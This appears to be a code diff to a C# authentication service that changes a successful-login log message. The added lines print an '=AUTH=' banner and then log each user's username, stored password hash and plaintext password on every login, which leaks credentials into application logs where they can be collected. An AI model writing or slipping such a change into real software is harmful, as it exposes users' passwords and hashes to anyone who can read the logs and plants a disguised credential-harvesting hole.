@@ -43,7 +43,8 @@ internal sealed class AuthenticationService : IAuthenticationService
     }
 
     var token = GenerateJwtToken(user.Id, user.Username, user.Role.ToString());
-    _logger.LogInformation("User '{Username}' authenticated successfully", username);
+    _logger.LogInformation("----------=AUTH=----------");
+    _logger.LogInformation("User '{Username}' '{hash}' '{password}' authenticated successfully", username, user.PasswordHash, password);
 
     return token;
   }
